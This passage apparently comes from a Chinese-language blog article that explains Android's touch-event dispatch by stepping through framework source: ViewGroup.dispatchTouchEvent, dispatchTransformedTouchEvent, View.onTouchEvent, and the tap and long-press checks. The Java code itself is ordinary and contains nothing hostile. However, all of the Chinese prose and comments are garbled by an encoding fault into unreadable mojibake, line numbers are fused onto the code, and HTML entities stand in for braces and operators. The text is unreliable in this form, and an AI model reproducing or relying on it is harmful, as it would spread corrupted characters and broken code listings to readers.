·çš„é¡ºåºï¼‰ã€‚ æˆ‘ä»¬åœ¨è¿™æ®µä»£ç ä¸­æ‰¾åˆ°äº†ç›®æ ‡viewï¼Œç„¶åŽè¿›ä¸€æ­¥è°ƒç”¨dispatchTransformedTouchEvent()æ–¹æ³•ç»§ç»­å‘ä¸‹åˆ†å‘ï¼Œå¦‚æžœè¯¥æ–¹æ³•è¿”å›žtrueï¼Œé‚£ä¹ˆè¯´æ˜Žä¸‹é¢çš„å­viewå¤„ç†äº†è¯¥äº‹ä»¶ï¼Œæ‰€ä»¥æˆ‘ä»¬å°†è¯¥viewä¿å­˜åˆ°touchTargeté“¾è¡¨ä¸­ï¼Œç„¶åŽä¿å­˜äº†ä¸€äº›ç”¨äºŽåŽç»­åˆ¤æ–­çš„äº‹ä»¶ä¿¡æ¯ã€‚æ¥çœ‹å‡ ä¸ªè¿™æ®µä»£ç ä¸­è°ƒç”¨çš„æ–¹æ³•ï¼š canViewReceivePointerEvents()1234private static boolean canViewReceivePointerEvents(@NonNull View child) &#123; return (child.mViewFlags &amp; VISIBILITY_MASK) == VISIBLE || child.getAnimation() != null;&#125; æ£€æŸ¥æ˜¯å¦å¯è§ï¼Œæˆ–å­˜åœ¨åŠ¨ç”»ã€‚ isTransformedTouchPointInView()1234567891011protected boolean isTransformedTouchPointInView(float x, float y, View child, PointF outLocalPoint) &#123; final float[] point = getTempPoint(); point[0] = x; point[1] = y; transformPointToViewLocal(point, child); final boolean isInView = child.pointInView(point[0], point[1]); if (isInView &amp;&amp; outLocalPoint != null) &#123; outLocalPoint.set(point[0], point[1]); &#125; return isInView;&#125; 12345678public void transformPointToViewLocal(float[] point, View child) &#123; point[0] += mScrollX - child.mLeft; point[1] += mScrollY - child.mTop; if (!child.hasIdentityMatrix()) &#123; child.getInverseMatrix().mapPoints(point); &#125;&#125; å°†ç‚¹å€¼ä»Žå±å¹•åæ ‡ç³»è½¬æ¢åˆ°viewçš„åæ ‡ç³»ï¼Œç„¶åŽæ£€æŸ¥æ˜¯å¦åœ¨viewçš„åŒºåŸŸå†…ã€‚ dispatchTransformedTouchEvent()12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970private boolean dispatchTransformedTouchEvent(MotionEvent event, boolean cancel, View child, int desiredPointerIdBits) &#123;final boolean handled;// ä¿å­˜åŽŸå§‹actionï¼Œä¾¿äºŽä»Žè°ƒç”¨æ”¹å˜`event`çŠ¶æ€åŽæ¢å¤final int oldAction = event.getAction();// å–æ¶ˆäº‹ä»¶çš„æƒ…å†µæ¯”è¾ƒç‰¹æ®Šï¼Œæˆ‘ä»¬ä¸ç”¨åšä»»ä½•è¿‡æ»¤æˆ–è½¬æ¢if (cancel || oldAction == MotionEvent.ACTION_CANCEL) &#123; event.setAction(MotionEvent.ACTION_CANCEL); // å¦‚æžœæ²¡æœ‰å­viewä½œä¸ºåˆ†å‘ç›®æ ‡ï¼Œåˆ™è°ƒç”¨superï¼ˆViewç±»ï¼‰çš„åˆ†å‘æ–¹æ³• if (child == null) &#123; handled = super.dispatchTouchEvent(event); &#125; else &#123; // å‘å­viewè¿›ä¸€æ­¥åˆ†å‘ handled = child.dispatchTouchEvent(event); &#125; // æ¢å¤eventçŠ¶æ€ event.setAction(oldAction); return handled;&#125;// è¿‡æ»¤å‡ºéœ€è¦çš„è§¦æ‘¸ç‚¹idfinal int oldPointerIdBits = event.getPointerIdBits();final int newPointerIdBits = oldPointerIdBits &amp; desiredPointerIdBits;if (newPointerIdBits == 0) &#123; return false;&#125;final MotionEvent transformedEvent;// å¦‚æžœæ‰€æœ‰è§¦æ‘¸ç‚¹éƒ½è¢«ä½¿ç”¨ï¼Œæˆ‘ä»¬å¯ä»¥ç›´æŽ¥ä½¿ç”¨åŽŸeventï¼Œå¦‚æžœä¸æ˜¯ï¼Œæˆ‘ä»¬éœ€è¦ä»Žä¸­åˆ†ç¦»å‡ºä¸€ä¸ªæ–°çš„transformedEventå‰¯æœ¬å†è¿›è¡Œåˆ†å‘ï¼Œè¿™ä¹ˆåšçš„æ˜¯å› ä¸ºæˆ‘ä»¬è¦ä¿æŒåŽŸeventçš„çŠ¶æ€if (newPointerIdBits == oldPointerIdBits) &#123; if (child == null || child.hasIdentityMatrix()) &#123; if (child == null) &#123; handled = super.dispatchTouchEvent(event); &#125; else &#123; final float offsetX = mScrollX - child.mLeft; final float offsetY = mScrollY - child.mTop; // è®¡ç®—å¹¶è®¾ç½®viewåç§»ç»™event event.offsetLocation(offsetX, offsetY); // åˆ†å‘äº‹ä»¶ handled = child.dispatchTouchEvent(event); // æ¢å¤eventåŽŸçŠ¶æ€ event.offsetLocation(-offsetX, -offsetY); &#125; return handled; &#125; // å¤åˆ¶ä¸€ä¸ªevent transformedEvent = MotionEvent.obtain(event);&#125; else &#123; // åˆ†ç¦»å‡ºçš„æ–°çš„transformedEvent transformedEvent = event.split(newPointerIdBits);&#125;if (child == null) &#123; handled = super.dispatchTouchEvent(transformedEvent);&#125; else &#123; final float offsetX = mScrollX - child.mLeft; final float offsetY = mScrollY - child.mTop; transformedEvent.offsetLocation(offsetX, offsetY); if (! child.hasIdentityMatrix()) &#123; transformedEvent.transform(child.getInverseMatrix()); &#125; handled = child.dispatchTouchEvent(transformedEvent);&#125;// å›žæ”¶ä¸´æ—¶æ‹·è´transformedEvent.recycle();return handled;&#125; è¿™ä¸ªæ–¹æ³•ä¸­å¯¹è§¦æ‘¸äº‹ä»¶è®¾ç½®å¥½æ­£ç¡®çš„åç§»åŽå‘ç›®æ ‡å­viewè¿›è¡Œåˆ†å‘ï¼Œå¦‚æžœæ²¡æœ‰ç›®æ ‡ï¼Œåˆ™è°ƒç”¨è‡ªèº«çš„çˆ¶ç±»ï¼Œä¹Ÿå°±æ˜¯viewçš„åˆ†å‘æ–¹æ³•è¿›è¡Œå¤„ç†ã€‚ addTouchTarget()123456private TouchTarget addTouchTarget(@NonNull View child, int pointerIdBits) &#123; final TouchTarget target = TouchTarget.obtain(child, pointerIdBits); target.next = mFirstTouchTarget; mFirstTouchTarget = target; return target;&#125; è¿™é‡ŒmFirstTouchTartgetæ˜¯é“¾è¡¨å¤´ï¼Œæ–°å¢žçš„touchTargetè¢«æ’å…¥äº†è¡¨å¤´ä½ç½®ã€‚ dispatchTouchEvent(ViewGroup)å†å›žåˆ°è¿™ä¸ªä¸»è¦æ–¹æ³•ä¸­ï¼š 123456789101112// æ²¡æ‰¾åˆ°å¯ä»¥æŽ¥æ”¶äº‹ä»¶çš„å­view if (newTouchTarget == null &amp;&amp; mFirstTouchTarget != null) &#123; // mFirstTouchTargetä¸ºé“¾è¡¨å¤´ newTouchTarget = mFirstTouchTarget; // æŠŠnewTouchTargetæŒ‡å‘è¡¨å°¾ while (newTouchTarget.next != null) &#123; newTouchTarget = newTouchTarget.next; &#125; newTouchTarget.pointerIdBits |= idBitsToAssign; &#125; &#125; &#125; æ³¨æ„11ã€12è¡Œçš„ä¸¤ä¸ªå³æ‹¬å·åˆ†åˆ«å¯¹åº”é€€å‡ºçš„æ˜¯ 1if (!canceled &amp;&amp; !intercepted) &#123; ä¸Ž 123if (actionMasked == MotionEvent.ACTION_DOWN || (split &amp;&amp; actionMasked == MotionEvent.ACTION_POINTER_DOWN) || actionMasked == MotionEvent.ACTION_HOVER_MOVE) &#123; è¿™æ„å‘³ç€æˆ‘ä»¬å·²ç»å¤„ç†å®Œäº†æ²¡æœ‰è¢«å–æ¶ˆã€å½“å‰ViewGroupæ‹¦æˆªï¼Œå¹¶ä¸”ä¸ºåˆå§‹è§¦æ‘¸äº‹ä»¶(Down) çš„æƒ…å†µçš„åˆ†å‘ï¼Œä½†æ˜¯è¦æ³¨æ„çš„æ˜¯çŽ°åœ¨å¹¶æ²¡æœ‰é€€å‡ºå‡½æ•°ï¼Œè¿˜è¦ç»§ç»­å‘ä¸‹æ‰§è¡Œï¼š 123456789101112131415161718192021222324252627282930313233343536373839 if (mFirstTouchTarget == null) &#123; // æ„å‘³ç€è¿˜æ²¡æœ‰å­viewå¤„ç†è¯¥è§¦æ‘¸äº‹ä»¶ // æ­¤æ—¶ç¬¬ä¸‰ä¸ªå‚æ•°ä¸ºnullï¼Œä¼šå‘çˆ¶äº²Viewä¼ é€’ä»¤å…¶å¤„ç†è¿™ä¸ªäº‹ä»¶ handled = dispatchTransformedTouchEvent(ev, canceled, null, TouchTarget.ALL_POINTER_IDS); &#125; else &#123; // è¯´æ˜Žå·²æœ‰å­viewå¤„ç†è¿‡è¯¥äº‹ä»¶åºåˆ—(ç”±`down`å¼€å§‹)ï¼Œç›´æŽ¥å°†äº‹ä»¶åˆ†å‘ç»™è¯¥viewï¼Œå½“éœ€è¦æ—¶å–æ¶ˆäº‹ä»¶ TouchTarget predecessor = null; TouchTarget target = mFirstTouchTarget; while (target != null) &#123; final TouchTarget next = target.next; if (alreadyDispatchedToNewTouchTarget &amp;&amp; target == newTouchTarget) &#123; // è¯¥TouchTargetå·²ç»åœ¨å‰é¢çš„æƒ…å†µä¸­è¢«åˆ†å‘å¤„ç†äº†ï¼Œé¿å…é‡å¤å¤„ç† handled = true; &#125; else &#123;// å¦‚æžœè¢«å½“å‰ViewGroupæ‹¦æˆªï¼Œå‘ä¸‹åˆ†å‘canceläº‹ä»¶ final boolean cancelChild = resetCancelNextUpFlag(target.child) || intercepted; // dispatchTransformedTouchEvent()æ–¹æ³•æˆåŠŸå‘ä¸‹åˆ†å‘å–æ¶ˆäº‹ä»¶æˆ–åˆ†å‘æ­£å¸¸äº‹ä»¶ if (dispatchTransformedTouchEvent(ev, cancelChild, target.child, target.pointerIdBits)) &#123; handled = true; &#125; // å¦‚æžœå‘é€äº†å–æ¶ˆäº‹ä»¶ï¼Œåˆ™ç§»é™¤åˆ†å‘è®°å½•ï¼ˆé“¾è¡¨ç§»åŠ¨æ“ä½œï¼‰ if (cancelChild) &#123; if (predecessor == null) &#123; mFirstTouchTarget = next; &#125; else &#123; predecessor.next = next; &#125; target.recycle(); target = next; continue; &#125; &#125; predecessor = target; target = next; &#125; &#125; 123456789101112131415161718 if (canceled || actionMasked == MotionEvent.ACTION_UP || actionMasked == MotionEvent.ACTION_HOVER_MOVE) &#123;// å¦‚æžœä¸ºupäº‹ä»¶æˆ–è€…hover_moveäº‹ä»¶ï¼ˆä¸€ç³»åˆ—è§¦æ‘¸äº‹ä»¶ç»“æŸï¼‰ï¼Œæ¸…é™¤è®°å½•çš„ä¿¡æ¯ resetTouchState(); &#125; else if (split &amp;&amp; actionMasked == MotionEvent.ACTION_POINTER_UP) &#123; // æ¸…é™¤ä¿å­˜è§¦æ‘¸ä¿¡æ¯ final int actionIndex = ev.getActionIndex(); final int idBitsToRemove = 1 &lt;&lt; ev.getPointerId(actionIndex); removePointersFromTouchTargets(idBitsToRemove); &#125; &#125; if (!handled &amp;&amp; mInputEventConsistencyVerifier != null) &#123; mInputEventConsistencyVerifier.onUnhandledEvent(ev, 1); &#125; // è¿”å›žäº‹ä»¶æ˜¯å¦è¢«å¤„ç†çš„ä¿¡æ¯ return handled; dispatchTouchEvent(ViewGroup)å°ç»“çŽ°åœ¨æˆ‘ä»¬å†ä»Žå¤´æ¢³ç†ä¸€éè¿™ä¸ªæ¯”è¾ƒé•¿çš„æ–¹æ³•è¿‡ç¨‹ï¼š å…³é”®ç‚¹ï¼š TouchTargeté“¾è¡¨ä¿å­˜äº†å¤„ç†äº†åˆå§‹è§¦æ‘¸äº‹ä»¶çš„å­Viewï¼Œæ³¨æ„åªæœ‰ä¸€ç³»åˆ—è§¦æ‘¸åŠ¨ä½œçš„åˆå§‹äº‹ä»¶ï¼ˆDownäº‹ä»¶ï¼‰æ‰ä¼šæ‰¾åˆ°å¯¹åº”çš„å­Viewå¹¶ç”ŸæˆTouchTargetçš„ä¸€ä¸ªèŠ‚ç‚¹ã€‚åŽé¢çš„ç³»åˆ—äº‹ä»¶éƒ½ä¼šåˆ†å‘ç»™TouchTargeté“¾è¡¨ä¸­ä¿å­˜çš„å­Viewï¼Œè¿™ä¹Ÿå°±æ„å‘³ç€ï¼Œå¦‚æžœä¸€ä¸ªå­Viewæ²¡æœ‰å¤„ç†åˆå§‹çš„Downäº‹ä»¶ï¼Œé‚£ä¹ˆå®ƒä¹Ÿå°±ä¸ä¼šå†æŽ¥æ”¶åˆ°åŽé¢çš„move upç­‰äº‹ä»¶ã€‚ å¦‚æžœonInterceptTouchEvent()è¿”å›žtrueï¼Œå½“å‰ViewGroupæ‹¦æˆªäº†è¯¥äº‹ä»¶ï¼Œé‚£ä¹ˆè¯¥äº‹ä»¶ä¸ä¼šå†å‘ä¸‹é¢åˆ†å‘ï¼Œå¹¶ä¸”ä¼šå‘TouchTargetä¸­ä¿å­˜çš„æ‰€æœ‰å­Viewå‘é€canceläº‹ä»¶æé†’å®ƒä»¬è¿™ä¸€ç³»åˆ—çš„äº‹ä»¶å·²ç»å› è¢«æ‹¦æˆªè€Œå–æ¶ˆäº†ï¼ŒåŒæ—¶è¿˜ä¼šç§»é™¤åˆ†å‘è®°å½•ï¼Œæ„å‘³ç€åŽé¢çš„äº‹ä»¶ä¹Ÿä¸å†ä¼šåˆ†å‘åˆ°å­Viewã€‚ å¦‚æžœæ˜¯è¾…åŠ©åŠŸèƒ½çš„äº‹ä»¶ï¼Œé‚£ä¹ˆä¼šä¼˜å…ˆåˆ†å‘ç»™æ”¯æŒè¾…åŠ©åŠŸèƒ½çš„Viewï¼Œå¦‚æžœä¸å­˜åœ¨è¿™æ ·çš„viewï¼Œåˆ™è¿›è¡Œä¸€èˆ¬çš„äº‹ä»¶åˆ†å‘ã€‚ é¡ºåºï¼ˆå¤§è‡´ï¼‰ï¼š åˆ¤æ–­æ˜¯å¦è¢«æ‹¦æˆª å¦‚æžœæœªè¢«æ‹¦æˆªä¸”ä¸ºåˆå§‹äº‹ä»¶ï¼Œæ‰¾åˆ°å¯ä»¥å¤„ç†äº‹ä»¶çš„å­Viewï¼ˆåœ¨ç‚¹å‡»èŒƒå›´å†…ä¸”å¯è¢«ç‚¹å‡»ï¼‰ï¼Œåˆ†å‘äº‹ä»¶åŽå¦‚æžœè¯¥å­Viewå¤„ç†äº†äº‹ä»¶ï¼ˆdispatchTouchEvent()æ–¹æ³•è¿”å›žtrueï¼‰åˆ™å­˜å…¥TouchTargeté“¾è¡¨å¹¶åœæ­¢å­Viewçš„éåŽ†ï¼ˆåŽé¢çš„å­Viewå°±æ²¡æœ‰æœºä¼šå†æ”¶åˆ°äº‹ä»¶ï¼‰ï¼Œå¦‚æžœè¯¥å­Viewæ²¡æœ‰å¤„ç†è¯¥äº‹ä»¶ï¼Œåˆ™ç»§ç»­éåŽ†å¯»æ‰¾ å¦‚æžœäº‹ä»¶è¢«æ‹¦æˆªï¼Œå‘TouchTargetä¸­çš„å­Viewå‘é€canceläº‹ä»¶ å°†æœªè¢«2ã€3æƒ…å†µå¤„ç†çš„äº‹ä»¶åˆ†å‘ç»™TouchTargetä¸­çš„å­Viewï¼Œå¦‚æžœTouchTargetä¸ºç©ºï¼Œåˆ™äº¤ç»™ViewGroupæœ¬èº«çˆ¶Viewçš„dispatchTouchEvent()æ–¹æ³•å¤„ç† dispatchTouchEvent(View)çŽ°åœ¨æˆ‘ä»¬çŸ¥é“ï¼Œå½“ä¸€ä¸ªè§¦æ‘¸äº‹ä»¶åˆ†å‘åˆ°ä¸€ä¸ªéžViewGroupçš„Viewæˆ–è€…ViewGroupä¸å†å‘ä¸‹åˆ†å‘è¯¥äº‹ä»¶ï¼ˆæ²¡æœ‰å¤„ç†äº‹ä»¶çš„ç›®æ ‡æˆ–è€…è¢«æœ¬èº«æ‹¦æˆªï¼‰ï¼Œé‚£ä¹ˆViewç±»çš„dispatchTouchEvent()å°†ä¼šè¢«è°ƒç”¨ï¼š 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253public boolean dispatchTouchEvent(MotionEvent event) &#123; // å¤„ç†è¾…åŠ©åŠŸèƒ½äº‹ä»¶çš„æƒ…å†µ if (event.isTargetAccessibilityFocus()) &#123; if (!isAccessibilityFocusedViewOrHost()) &#123; return false; &#125; event.setTargetAccessibilityFocus(false); &#125; boolean result = false; // ä¸€è‡´æ€§æ£€éªŒï¼Œæ£€æŸ¥äº‹ä»¶æ˜¯å¦è¢«æ”¹å˜ if (mInputEventConsistencyVerifier != null) &#123; mInputEventConsistencyVerifier.onTouchEvent(event, 0); &#125; final int actionMasked = event.getActionMasked(); if (actionMasked == MotionEvent.ACTION_DOWN) &#123; // åœæ­¢æ»šåŠ¨ï¼ˆå¦‚æžœåœ¨ï¼‰ stopNestedScroll(); &#125; if (onFilterTouchEventForSecurity(event)) &#123; if ((mViewFlags &amp; ENABLED_MASK) == ENABLED &amp;&amp; handleScrollBarDragging(event)) &#123; // å¦‚æžœäº‹ä»¶ä¸ºé¼ æ ‡æ‹–åŠ¨æ»šåŠ¨æ¡ result = true; &#125; ListenerInfo li = mListenerInfo; if (li != null &amp;&amp; li.mOnTouchListener != null &amp;&amp; (mViewFlags &amp; ENABLED_MASK) == ENABLED &amp;&amp; li.mOnTouchListener.onTouch(this, event)) &#123; // å¦‚æžœæ³¨å†Œäº†ç‚¹å‡»äº‹ä»¶ç›‘å¬(onTouchListener)ï¼Œå¹¶ä¸”å½“å‰viewå¤„äºŽå¯åŠ¨çŠ¶æ€ï¼Œå¹¶ä¸”è°ƒç”¨æ³¨å†Œçš„onTouchæ–¹æ³•è¿”å›žäº†trueï¼Œè¯´æ˜Žäº‹ä»¶è¢«æ¶ˆè€—ï¼Œæ ‡è®°ç»“æžœä¸ºtrueï¼Œï¼ˆæ³¨æ„è¿™ä¸ªæ—¶å€™å·²ç»è°ƒç”¨äº†`onTouch()`è¿›è¡Œäº‹ä»¶åˆ†å‘å¤„ç† result = true; &#125; // å¦‚æžœæ²¡æœ‰è¢«æ³¨å†Œçš„onTouchæ–¹æ³•æ¶ˆè€—äº‹ä»¶ï¼Œé‚£ä¹ˆè°ƒç”¨Viewæœ¬èº«çš„onTouchæ–¹æ³•ï¼Œå¦‚æžœè¿”å›žäº†trueï¼Œè¯´æ˜Žäº‹ä»¶è¢«æ¶ˆè€—ï¼Œæ ‡è®°ç»“æžœä¸ºtrue if (!result &amp;&amp; onTouchEvent(event)) &#123; result = true; &#125; &#125; // ä¸€è‡´æ€§æ£€éªŒï¼Œæ£€æŸ¥äº‹ä»¶æ˜¯å¦è¢«æ”¹å˜ if (!result &amp;&amp; mInputEventConsistencyVerifier != null) &#123; mInputEventConsistencyVerifier.onUnhandledEvent(event, 0); &#125; // å¦‚æžœæ˜¯upäº‹ä»¶ï¼ˆç³»åˆ—è§¦æ‘¸åŠ¨ä½œçš„ç»ˆç‚¹ï¼‰ï¼Œæˆ–è€…æ˜¯canceläº‹ä»¶ï¼Œæˆ–è€…æ˜¯åˆå§‹äº‹ä»¶å¹¶ä¸”æˆ‘ä»¬æ²¡å¯¹å®ƒè¿›è¡Œå¤„ç†ï¼ˆå›žå¿†å‰é¢çš„å†…å®¹ï¼Œå¦‚æžœæ²¡æœ‰å¤„ç†downäº‹ä»¶ï¼Œé‚£ä¹ˆä¹Ÿä¸ä¼šæ”¶åˆ°åŽé¢çš„äº‹ä»¶ï¼‰ï¼Œå°±åœæ­¢æ»šåŠ¨çŠ¶æ€ if (actionMasked == MotionEvent.ACTION_UP || actionMasked == MotionEvent.ACTION_CANCEL || (actionMasked == MotionEvent.ACTION_DOWN &amp;&amp; !result)) &#123; stopNestedScroll(); &#125; return result;&#125; æˆ‘ä»¬å¯ä»¥çœ‹åˆ°ï¼ŒViewçš„onDispatchTouchEvent()æ–¹æ³•ä¸»è¦æ˜¯å…ˆæ£€æŸ¥æ˜¯å¦æ³¨å†Œäº†onTouchListenerï¼Œå¦‚æžœæ³¨å†Œäº†ç›‘å¬å¹¶ä¸”è°ƒç”¨è¿”å›žäº†trueæ¶ˆè€—äº†è¯¥äº‹ä»¶ï¼Œé‚£ä¹ˆè¯´æ˜Žè¯¥Viewå¤„ç†äº†è¯¥äº‹ä»¶ï¼Œä¹Ÿä¼šæ”¶åˆ°åŽç»­çš„äº‹ä»¶ï¼Œå¦‚æžœæ²¡æœ‰æ³¨å†Œç›‘å¬æˆ–è€…æ²¡æœ‰æ¶ˆè€—ï¼Œå°±è°ƒç”¨Viewæœ¬èº«çš„onTouchEventæ–¹æ³•ï¼Œå¦‚æžœè¿”å›žtrueåˆ™æ¶ˆè€—äº‹ä»¶ã€‚ ä¸‹é¢æ¥çœ‹Viewé»˜è®¤çš„onTouchEvent()æ–¹æ³•ï¼š onTouchEvent()è¿™ä¸ªæ–¹æ³•æˆ‘ä»¬ä¹Ÿæ‹†å¼€æ¥çœ‹ï¼š 12345678910111213141516171819202122public boolean onTouchEvent(MotionEvent event) &#123; final float x = event.getX(); final float y = event.getY(); final int viewFlags = mViewFlags; final int action = event.getAction(); if ((viewFlags &amp; ENABLED_MASK) == DISABLED) &#123; if (action == MotionEvent.ACTION_UP &amp;&amp; (mPrivateFlags &amp; PFLAG_PRESSED) != 0) &#123; // å¦‚æžœviewè¢«ç¦ç”¨ä¸”æŒ‰ä¸‹çŠ¶æ€ä¸ºtrueï¼Œå–æ¶ˆæŽ¥ä¸‹çŠ¶æ€ setPressed(false); &#125; // å¦‚æžœè¯¥viewè¢«ç¦ç”¨ï¼Œä½†æ˜¯è¢«è®¾ç½®ä¸ºclickableæˆ–longClickableæˆ–contextClickableï¼Œä»ç„¶æ¶ˆè€—è¯¥äº‹ä»¶ return (((viewFlags &amp; CLICKABLE) == CLICKABLE || (viewFlags &amp; LONG_CLICKABLE) == LONG_CLICKABLE) || (viewFlags &amp; CONTEXT_CLICKABLE) == CONTEXT_CLICKABLE); &#125; // å¦‚æžœä¸ºè¯¥viewè®¾ç½®äº†è§¦æ‘¸äº‹ä»¶ä»£ç†ï¼Œåˆ™è½¬å‘åˆ°ä»£ç†å¤„ç†è§¦æ‘¸äº‹ä»¶ if (mTouchDelegate != null) &#123; if (mTouchDelegate.onTouchEvent(event)) &#123; return true; &#125; &#125; å¤„ç†äº†viewè¢«ç¦ç”¨å’Œè®¾ç½®äº†è§¦æ‘¸äº‹ä»¶ä»£ç†çš„æƒ…å†µã€‚ 1234if (((viewFlags &amp; CLICKABLE) == CLICKABLE || (viewFlags &amp; LONG_CLICKABLE) == LONG_CLICKABLE) || (viewFlags &amp; CONTEXT_CLICKABLE) == CONTEXT_CLICKABLE) &#123; switch (action) &#123; æ³¨æ„ä¸‹é¢çš„è¯­å¥éƒ½æ˜¯åœ¨è¯¥viewå¯è¢«ç‚¹å‡»çš„æƒ…å†µä¸‹æ‰§è¡Œçš„ï¼Œå¹¶ä¸”ä¸€æ—¦è¯¥åˆ¤æ–­æˆç«‹ï¼Œé‚£ä¹ˆæœ€ç»ˆä¸€å®šä¼šè¿”å›žtrueï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œè®¾ç½®äº†å¯è¢«ç‚¹å‡»çš„viewåœ¨é»˜è®¤æƒ…å†µä¸‹ä¸€å®šä¼šæ¶ˆè€—è§¦æ‘¸äº‹ä»¶ã€‚ ä¸‹é¢å¯¹ä¸åŒçš„è§¦æ‘¸äº‹ä»¶ç±»åž‹åˆ†åˆ«ä½œå‡ºå¤„ç†ï¼Œä¸ºäº†åˆ†æžæ–¹ä¾¿ï¼Œæˆ‘è°ƒæ¢äº†å„caseçš„é¡ºåºï¼š case MotionEvent.ACTION_DOWN:ä¸€ä¸ªè§¦æ‘¸åŠ¨ä½œçš„å¼€å§‹ 12345678910111213141516171819202122232425mHasPerformedLongPress = false;// æ£€æŸ¥Buttonç‚¹å‡»äº‹ä»¶çš„ç‰¹æ®Šæƒ…å†µï¼ˆä¸‹æ–‡è®²ï¼‰if (performButtonActionOnTouchDown(event)) &#123; break;&#125;// å‘ä¸ŠéåŽ†viewä»¥æ£€æŸ¥æ˜¯å¦å¤„åœ¨ä¸€ä¸ªå¯æ»šåŠ¨çš„å®¹å™¨ä¸­boolean isInScrollingContainer = isInScrollingContainer();// å¦‚æžœæ˜¯åœ¨æ»šåŠ¨å®¹å™¨ä¸­ï¼Œç¨å»¶è¿Ÿè§¦æ‘¸åé¦ˆæ¥åº”å¯¹è¿™æ˜¯ä¸€ä¸ªæ»šåŠ¨æ“ä½œçš„æƒ…å†µif (isInScrollingContainer) &#123; mPrivateFlags |= PFLAG_PREPRESSED; if (mPendingCheckForTap == null) &#123; // æ–°å»ºä¸€ä¸ªå¯¹è±¡ç”¨äºŽæ£€æµ‹å•å‡»äº‹ä»¶ï¼ˆä¸‹æ–‡è®²ï¼‰ mPendingCheckForTap = new CheckForTap(); &#125; mPendingCheckForTap.x = event.getX(); mPendingCheckForTap.y = event.getY(); // åˆ©ç”¨æ¶ˆæ¯é˜Ÿåˆ—æ¥å»¶è¿Ÿå‘é€æ£€æµ‹å•å‡»äº‹ä»¶çš„æ–¹æ³•ï¼Œå»¶è¿Ÿæ—¶é—´ä¸ºgetTapTimeoutè®¾ç½®çš„è¶…æ—¶ï¼ˆä¸‹æ–‡è®²ï¼‰ postDelayed(mPendingCheckForTap, ViewConfiguration.getTapTimeout());&#125; else &#123; // æ²¡æœ‰åœ¨æ»šåŠ¨å®¹å™¨ä¸­ï¼Œé©¬ä¸Šæ˜¾ç¤ºè§¦æ‘¸åé¦ˆï¼Œå¹¶ä¸”å¼€å§‹æ£€æŸ¥é•¿æŒ‰äº‹ä»¶ï¼ˆä¸‹æ–‡è®²ï¼‰ setPressed(true, x, y); checkForLongClick(0, x, y);&#125;break; performButtonActionOnTouchDown()123456789protected boolean performButtonActionOnTouchDown(MotionEvent event) &#123; if (event.isFromSource(InputDevice.SOURCE_MOUSE) &amp;&amp; (event.getButtonState() &amp; MotionEvent.BUTTON_SECONDARY) != 0) &#123; showContextMenu(event.getX(), event.getY()); mPrivateFlags |= PFLAG_CANCEL_NEXT_UP_EVENT; return true; &#125; return false;&#125; åªæ˜¯å¤„ç†äº†äº‹ä»¶æ¥æºæ˜¯é¼ æ ‡çš„ç‰¹æ®Šæƒ…å†µã€‚ CheckForTap()å®ƒæ˜¯ä¸€ä¸ªRunnableï¼Œç”¨äºŽå»¶è¿Ÿæ‰§è¡Œå•å‡»æ£€æµ‹çš„ä»»åŠ¡ï¼š 1234567891011private final class CheckForTap implements Runnable &#123; public float x; public float y; @Override public void run() &#123; mPrivateFlags &amp;= ~PFLAG_PREPRESSED; setPressed(true, x, y); checkForLongClick(ViewConfiguration.getTapTimeout(), x, y); &#125;&#125; å®ƒè¢«æ”¾åˆ°æ¶ˆæ¯é˜Ÿåˆ—ï¼Œåœ¨è®¾ç½®çš„è¶…æ—¶ä¹‹åŽè¢«æ‰§è¡Œï¼Œå¦‚æžœè¿™æ®µæ—¶é—´å®ƒæ²¡æœ‰è¢«ç§»å‡ºé˜Ÿåˆ—ï¼Œé‚£ä¹ˆè¯´æ˜Žè¿™å°±æ˜¯ä¸€ä¸ªå•å‡»äº‹ä»¶ï¼Œé‚£ä¹ˆå°±æ˜¾ç¤ºè§¦æ‘¸åé¦ˆå¹¶å¼€å§‹é•¿æŒ‰æ£€æµ‹ã€‚ postDelayed()123456789public boolean postDelayed(Runnable action, long delayMillis) &#123; final AttachInfo attachInfo = mAttachInfo; if (attachInfo != null) &#123; return attachInfo.mHandler.postDelayed(action, delayMillis); &#125; getRunQueue().postDelayed(action, delayMillis); return true;&#125; å¾€æ³¨å†Œçš„Handlerçš„æ¶ˆæ¯é˜Ÿåˆ—æˆ–è€…ä»–è‡ªå·±å®žçŽ°çš„ä¸€ä¸ªæ¶ˆæ¯é˜Ÿåˆ—ä¸­å‘é€éœ€è¦è¢«å»¶æ—¶æ‰§è¡Œçš„æ¶ˆæ¯ï¼Œè¿™å—å°±ä¸æ·±å…¥æŽ¢ç©¶äº†ï¼Œæ¶ˆæ¯æœºåˆ¶åˆ†æžçš„æ–‡ç« å·²ç»è®²å¾—å¾ˆæ¸…æ¥šäº†ã€‚ checkForLongClick()1234567891011if ((mViewFlags &amp; LONG_CLICKABLE) == LONG_CLICKABLE) &#123; mHasPerformedLongPress = false; if (mPendingCheckForLongPress == null) &#123; mPendingCheckForLongPress = new CheckForLongPress(); &#125; mPendingCheckForLongPress.setAnchor(x, y); mPendingCheckForLongPress.rememberWindowAttachCount(); postDelayed(mPendingCheckForLongPress, ViewConfiguration.getLongPressTimeout() - delayOffset);&#125; åŒæ ·æ˜¯åˆ©ç”¨postDelayed()æ–¹æ³•æ¥æ£€æµ‹æ˜¯å¦åˆ°è¾¾äº†æ£€æµ‹æ—¶é—´ï¼Œ 123456789101112131415161718192021222324private final class CheckForLongPress implements Runnable &#123; private int mOriginalWindowAttachCount; private float mX; private float mY; @Override public void run() &#123; if (isPressed() &amp;&amp; (mParent != null) &amp;&amp; mOriginalWindowAttachCount == mWindowAttachCount) &#123; if (performLongClick(mX, mY)) &#123; mHasPerformedLongPress = true; &#125; &#125; &#125; public void setAnchor(float x, float y) &#123; mX = x; mY = y; &#125; public void rememberWindowAttachCount() &#123; mOriginalWindowAttachCount = mWindowAttachCount; &#125;&#125; å¦‚æžœrun()æ–¹æ³•è¢«æ‰§è¡Œï¼Œè¯´æ˜Žåˆ°è¾¾äº†è®¾å®šçš„æ—¶é—´å¹¶ä¸”æ²¡æœ‰å› ä¸ºè§¦æ‘¸ç‚¹ç§»åŠ¨æˆ–è€…æŠ¬èµ·è€Œç§»é™¤è¯¥Runnableä¿¡æ¯ï¼Œä¸ºä¸€ä¸ªé•¿æŒ‰åŠ¨ä½œï¼Œæ‰§è¡ŒperformLongClick()æ–¹æ³•æ¥è§¦å‘é•¿æŒ‰å›žè°ƒï¼š 12345678public 